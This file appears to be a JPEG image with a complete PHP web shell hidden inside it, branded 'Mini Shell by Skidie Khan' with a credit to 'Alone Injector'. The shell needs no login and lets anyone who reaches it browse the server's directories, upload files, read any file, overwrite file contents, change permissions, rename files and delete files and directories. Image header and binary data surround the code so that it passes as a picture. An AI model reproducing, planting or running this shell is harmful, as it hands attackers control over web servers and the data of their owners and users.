ÿØÿà JFIF   d d  ÿì Ducky     d  ÿî Adobe dÀ   ÿÛ „ ÿş'ñ
<?
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
<title>Mini Shell By Skidie Khan And Alone Injector</title>
<style>
body{
font-family: "Orbitron";
background-color: #58FC8C;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Orbitron";
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center><img width=33 height=44 src="http://www.sherv.net/cm/emoticons/hello/rude-greetings-smiley-emoticon.gif">
 Mini shell by Skidie Khan <img width=33 height=44 src="http://www.sherv.net/cm/emoticons/hello/rude-greetings-smiley-emoticon.gif">
 </center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Direktori : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File uploaded successfully!</font><br />';
}else{
echo '<font color="red">Upload failed! Fuck! <img src="http://c.fastcompany.net/asset_files/-/2014/11/11/4F4.gif"/>
 </font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done ^_^.</font><br />';
}else{
echo '<font color="red">Edit File Error ~_~.</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<center><br />Mini shell by <a href="https://www.facebook.com/Alone.Injector"><font color="red" >Alone Injector</font></a></center>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>			ÿÀ  8 – ÿÄ œ            	 

            	          !	1Q"A2
aq‘Bb#s       !1AQa" q±2‘¡bBR‚Ñr²S$ÿÚ   ? ‹~GËğÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒAÔM QB& P˜¤0ü 	„7Ô€OH‚@ë(E D‡)À a˜ ?AØGBë Aéê"a¤!¤!¤!¤"ò‰„€b‰À7îÀ‰wÜ}Od"­D!¤!¤!¤!¤"9DD b‰‹·q@@D»ï¶à¸o¶¦G¬DU¨‰††††¶ıñÛ¡Æ\¥É«¦=„µäaÉ6ÚË9{}„Ãúí:W­Ê’>¬œ»u	â^BYÊ®GÆ£’!$L 1ûÙËCmÇm+½+·G*¬T5Jâo·¨P  f¤	˜Úüf1µru©†¸õA T,úL“9uÓº!'ÙG6©ÜìÉÖíAÂs8q…•1Yqüñ]ÏF|²ÍåüuøÆI7ì‘Ê(”ÆØ·ÎŞàBï†X\Yß^%ÛÖ¬®nd»Jù‰œÎ½Ÿ¥r<ÕåÍ:öôŠÓB²23™œôë¶±NÜÄ#‚(ÜêÉ‘Âg@ÊĞ…T¤ùo«ğó	¬ˆğÖ+§NºE!Ôé¦ &QS‚i&P(ª†ı©¤™@N¢†Û¡J#©ñìsØÉHÏò‘R±~a Ddã_G‚Â=@Ğwı;w×©N¤ı6V—q äbYY~ GÄÙ1&±ÛF0(å2ÔoÉÔ‹„È? Qh®©?Q 
KºSª2ª÷’ ı`ªÌd “à'òÃJ`ƒ¼J…•iäEÕæŸ-õ%2Øã¼dñ²€šÉ‘ËUCÀQ˜uÑvì–5«S:Š.Tğ¤‚Ê*á††¢‚>$i8{ëãvÂ ¸+	ãÜp¼®f™dğ¸ê‰

10ÕÒéµ~î8’òÈ¦±
 cªP8¶Ü7×Ï>ÊçóŒŞB¦fò½À[E#Õ¨Ìª}UÕîĞÙ\ïeeal¶4iÓ&±Å Ÿ!ë!3¶:jíƒƒ4~ÑÜ{ÂfÚ¸dì¤€s6tšK”‚?%Øuôj²ºîB{Á~b5‰NÖ7‘[&/äÔU¸ù	E‘ 2ÈÆ1w"ª%Ü²lÑ\éC®æ 
Ò˜İQ•Aï |àªÍ¢O€ŸÊ8¦"Š¢r™58¦²*É¬ŠòšÉ
¢G¡€ \»'Øb<;c”Å„„™ÕN.:FQDuÓŒ`îDèÛ€®Fh®d@C¯İ·MpwJ`ŒªyçªÍô‚~qœø¥[€¸ò›tËl;9êİ“<âŠÍ¦¹*‰”e+
1yƒ—…•j&MAlı‹ƒ¤²b%!Ä:kÉn+Úq»û»W)qNÊ³£¯Ue¦ÅYOx"`Ç»Jl¥µ
À56®ŠÀô °ŒN_÷àÜ1ƒc¸‰†ñN<Å±²Í&Ş‡P«(,RÆ`ÌÒËC±h¼¡™ƒ•<Fpe?!ûD;¾œö?1–Ì¾R®Væ½ÍEô$j;<§ëOnâe9	ÊSî‹¿>²³±KD³¥N’ŸR{T,å³¬†¿Œkz-?)šº"@0ªvË‘.ÓMå2`MŒ& ß®úß›–r˜ŸÄF¹‘î1gSii¶²~T•K~ß"gO»mû{Ê%ßmÃ}·× dAñˆ"bQúúéæS.Wñ
ÖdiMĞÇÒV~¥hÖ6óÃ0¦<©×).(AÃ¦Ì&ÿ h"(*(ön'>û Ã|ó‰¿å×»WU«¿a]¾«°Û-Í=²ë1>áûf+ˆ7‚Ÿ¦)’’œç±Aœä:Ïº ›û…¶ff´ÏXÓ‚W¼™0ËÎ0¼~&¢YÜÛ%ãBS$5½Ë^\ÈBc ŞÎÉÕ€$vIE!7œ{»s_{WkŠâg	ÍQ·¤r¹¯Q)•#Mi€Õ†¢lÓÜzı:N(ô9}[¼À¿¶±©UÅ·¦[q}Å¦õ;:ÄêñêôÓØ6)Éõ®Rğ>Ù‚˜G¾B´¥37×ˆılLäJ«ŒıBRR«Wlæ-b#¬İ×fàQ%€âºk;dÜ%mqÆóT¯]”¿©nÒØÊÒÚà;‚¬‰!„ÁëxÇ×ûZ´ò–/AA–Ú‚{T•S§† ÊF<êkS‹üZä-'éŒo™vä¢Lì2ØHX¢1×¬6ºÛ:íYÔŠJ%	%`=5Ó§nRñÊ®S*¦Ñ!Bíîo Ëò>GcÆ(U4,jÑ´š‚Bµ[¥G,à}A}@€–¤Æ Šcl±˜»Œ­D.ëjdHJE€
>„í$‘Özôˆøä×½Æ\ªãÎ`Á\UF¦ã)S¤jÕ‹jY5•¤j’2Â‘Ë=Š}@ˆ3ƒ36Âalá57´~ W=ìËq¬í®jHÕ[j¡İ=›ÂõPEV”üAñ_És‘”ÇÖ±{]†ª
¼6Òz6ĞÄüÉc[×8•©Üâ½[3ä&ŠÕ!'bØ (KL¦¬;·¶¼—u³É¸dúÉ.şQ¡	âóŠ…Qé; ĞÃIÓÈYs^O^ë›dªZXì¬ªó ”© "…3œ¥%3›4âúÖÕğXªtp6©Zàn
=&ÎÌdX“ãÛÜ#Ë>×p%K+q òzõŠ"1"ñİßVY`jh™
*—,E¬İ±Œí¦ ŞÙîÄc"©Œ¢erÈ‹ $Øı´ÍÜã9MÇ³¹kŒ
z7H³Ü½:UeFÕ…ÔhdÄÈKÊl)]â)dëÒ²Ş‹„ÎªÈX}@Oó±êÏfıgëïãœ‚lF\·/x»<¨Ã0VĞŞ¤Ş
FĞgÉ-&zıÑ¼íŠM
&1ÀLp)v×·Ü!¹ÅıÅİ}­*4C±Ø\´Ø(Üƒ©œÉü#)É3ÃoNãÑõ]Ü¨¶ËBIœt£Ì^Ëi¸Û›µhİZ{JİºØ§nt	ÇãŞZèÄÌ—Ü}U–„ä¤«Ö†½.“„ƒµ³…QMQLDû,^ß]ä8‡¸ğ¢©©kKîéÕPHJ…:®­¶zÔÁ ¨‰È™ã9%l×§}°-gôYI–åõ‰÷IŒûíËŞLa¯L8
W0ç£l‘–©Ç4èÈX©¶“(…f
9YË=²ÎZôôŠË)ÜMÔY¨áÂ§QEJRMãâÜ-îÎnîã-~ÔêRAP±SSWmªˆ›”*àd  
f;òù+>aF¸efÚ !~‘2ÌÒ$±øj{cûJãfæxûÉèJ{
F»İ8Ä-­Ç¶´©CäU®—R’¬YŞ°H‰O+å ·—ñİ2•5•)ó>ÜgòÜW“_qÚÕZ½…7sBIORÕ*8t éİé•2”Õµ™^O³Ëâmòh‚Ã½0vÚ¬ªUˆë-À‰ô#N¦349i‡ı5á¼RÄnŠŸ‚¸ÈÍ×ãkğ3¬h¨3Œ¤ED<š›
õ‚FÇf•d@p™”p¹”Uu÷
‡â\c)î¾Vòë+d­IU‹2š“5
U]ÊiĞ £»İ™ËYğû:m-Ã#’ .Š$™XÌuêfI­Îì%†ò¼W9³Y¤FÔ²Hrw‡’ÿ Î5`Å„äı,Şªiš³oZ92§6êÜË7
ÖTÊ±ĞT‰Xà>—Ëc*f¸…Åf«ş:ùv’J­J4ßÎ“úC`@”æ	:ó–VwKaš¦.~æÜÎ@µtiu”ÁÒ2ë›ükrc…ÃoaçÁØdÙjñ•ÁQFÆu\ã@¨cÂDtíÒq«ğ€€-›’÷EßÂù—ÿ #ÇòßjÒÌ]úèşİ+o«ş ¿½”ô=™ÜóY+/Xá£ê3øıSüˆ3ı ÷ˆ‚ÿ {ÜâÈù¯
q+–-ñÆ”nó+½†I»v¶L¢Å#O!Û¥<65h°‚ébacÅîbAÖäöc‡=…åy0MıÚ‘D4ÉJ'«ëıUOC×`ŸG1Gç9µ¹¸{B>Ş‰›ËµÇEø'oîÿ lkË­çşBBB7,ôQ!ÛÖ®TAËöM–6[Í¦*N Š‚SQ©ÀSP¦í0€ì?ùKŞjuÜ
bªHû[~€ÿ ÙR7 er¨$ëTÿ ŠÆ$şÛì‰›aìç	+_‰Íïr3
K¦/–hŞ~ÉB5>2¸æ1•IäÄ]rq¬™VIàh«°1û?$¢lŸ¿–96ÊÙd
»aÅ¹@@%R¦ö.b³©IõÒ{L¼¾İ\Z
JöÓQzjÖSdÚ —x4û§ã-Åä%=ÖG©òÃ”˜g8d3Ë4›«WqİZ¿A}D£Ï¢i¸†ïaøÌ¼ö¬áM )‘e„Lmj~MüÒÛİqœmİÒ®Õ]ªŠ•4'k´m€ë9"áŠşB‰©K+uF½Äæ¡&Õé¨œÌÏIJf#[ÖzÂy—
rÓ‚¶ûìU/"›3ræ°„[¹èù{- /ßo
f¦’¤o;!
êÈíºíÒ@È$¡ËâX¦ƒî/ŠËã9•­­aö–O¸U*P§OÉRZ¨`ªA2d
AŠç¿²¼³»ÁÖ¨ãÖ®²$ËQ›Ì³êDÈ#²@öÄnrÑMŠ¼yËùÎW–?ÕrÊ›%g©TMâjŸÕ2q~3FÅ½’y}šWwjvŠÕ¹”0ïÙ×`÷÷–¿%ÎÚá©c=*wB;ú¬ûê@×§‰—|W2|+Zùî÷µ$,«°.â:	î? ‰×i‘û0âUK‰ü½˜ãF"•iû,•"¦®Yv®ØYñµêîN.Iñ~ôÆ"ÅQªf¨8Dê o¿M5ƒû{ÉëÓäØ´¿°óª
›•K•i¸'!ÒFS*@=/áy&*›b®Í½Ç”’²,¤	22ÌLş€‰ˆ‹|q{“¼xÀL,ù“ÙnPÏñr—ÁHb
~­[b÷*ÕœFH³LË:Nº»4ß”)C·)ÔÂˆ†Èá\gsmm‰ãÖÖUÒá…tfwR(¸ò*Ó+¯|†±WÎã2xûVó%VºšÔ¦@PFõÔù‰ÒSü"W=ğE—²,m‹jUìÕYĞo.gg\C 7—lşºúÌÛ&ÎÑ ‹c¤|ÅTUT¦ííí
÷
iÀy›ğ
û›šö]ëÑö—4ŠÁ¦f>’”„Z¹r;jT©ÖÅ7İ9oœÁÜ;ãÇ^ÎóÎáŸñ‡+wÈ›îJ­9ã­fµRFR5ÕµÍk \hÖù[mª>9US¯3‘mE+r
ş"ªñéˆ¤PIjöï
˜å|Òã“\Qjú‚éİÈ!ÜS¨ŠˆOÔA©='%RL¦'‡ä×ÖX|,U*‚¥Êš@,ÆéSebÌ @vË^Ó!·–|vÁ>èğŸÄœ«±ªMº¸ÇÉÄÄEÜ´%’‘SÕ[•Hö)Jí/°‚$YbÑ1Lš„80üg=™ö—7wC)`Õª*Ìiƒ±·+Ó}¬€ÔAJ=Ù\}2°£RÒä*£n İDŠ²ÌGé.šÆ ö“Ê'ÄN)`.Õ®Q¹#Qn|fj¬d£ŸYĞøëj¦ÛØmˆF¨vĞìFnÍ²KxŒáËÃ"Šhªbfı¸ã¹~QÉo¹Í&¡aZ•ßœ‚ÔºJˆ'«õ
' ºêDü£'e‰Å[âé8©pGÊ'm&V›K¤ö€'Ô43¿1xµƒ}ÍaÌkÄÜ–Œ¯CRä&ì,&«ğÑwS«uŠ‰g;d­«`€“­Y¢†%Ü(E,EYw —
Åy&gÚ|­å¶OÕ*ÖUR¬Æ´Ëd}¬qÔ
Dˆ=şìÆ.Ç˜ÙĞ«kr’´`LÂ]½ÁÔyÛğ-à	jWÈ‹~CK“œ@‹qÒR6FR¯BÄ—šªƒcº=Qmş]ä34A`HëŠ«(B‚h˜uêá˜LÆIó\¾ê‹Ò±ş:ø‚AêW¦şJsÕ‚†bHœ¤31Õœ¿²µ[-*Š÷sn%0J¥6]Z]	 º‚2‡=ùÚ—ù?ÂYY™Ô•ÂyPÙ~ƒ™Z ì[C0YÎ05_ L¯zD³³¨±€½Ç‹pô…8“lw
á‡–qÜÅ:HFbÛĞ©@‘"Ä
Ûé|*(ıáIÇ«=œl•“;â«ê-OäÚÿ âzşÒÑ>ôx7•*\¹ÄK×Ó§æÙø
v]37Ì¿ˆ¯äYOJÖDrfF8%	vL|à¥1Eªj˜ÆQö¶Ÿ³|Æ­\m^/”÷VhÕ(LÍHjô„ÿ ª™ÕGö’:$T9Æé2Ö›}ì¦¢AÏGÓ±†„÷‰õh×Û$Ñ–Æ÷9zk‰¸›‘?Š#-uÁÉ]¶MÉ ¯ı¨.™T :fÜKĞwØC[ÂÂğ_Ú-Ú£S
?+u2üGŒP.(zÆ‰`Äv‘Ñuì˜ii¨P¡±UT…’‘UQúˆ”¦ 4ğ„QDUMÂ
ªƒ„L&EÂ
Ñ0†ÂdVHÄU#tÜ¢¶„$dAì† Ìu¾U¼Ê¹ó¯ù+ˆ
î|ë~BâºışU„7ÿ p’
!´tƒğ‡lûbØ€Å8õ9
â#ŞE¨(Cşâ¨?¸ }Lÿ (G%ÓÇ¯Å1~ùóñGo¿xéè£·Ç‹ò•WÇ·üv×TO ŸpåY›ê$üLâÛu×f¿å3pá“®ŞÏÉfáf{:ıvçM^Î¿í©`m`
÷1ù€H3ƒ +¸z¯ë‡W ‚ï\,í`)ƒcruTˆPß®Š	  x	| I&gSãš?`˜¥#"Á!
…&Ş2H@AM²ÉÓPÈfê¬|@?8Ìº) xG`ïQAê¢¦ïUC}Ê*õTÎ¡ÿ ÄDG\»%Ø""ëeÜ3Pë2på’Ê j‹2p³ET(ÀUntr€~‚"†Äœ<Dşp©šèbÈ Ç>ßz¦ªqêu?'Pã¹qıDDGSò„_l»†GQVN\²Q`íUFNh¢¥ÛnÕNİDŒ¡vı"âÊ®$à;Äşp®ªH>d 
c¿iÎqPç‡:ƒò¡q”¿púå¬Ç9ÿ zŠ)ÿ ¢‡Smşvï1¶ßQ§d *(%ÅUE1/h¦eT2bPÛb‰ÂA(mñ¶Úi×IÂ(  
€ ¯@
ƒ¨î?QÔÂ>ê!
!
!
!
!
!
!
!
!
!
!
!
!
!
!
!
!
!
!
!ÿÙ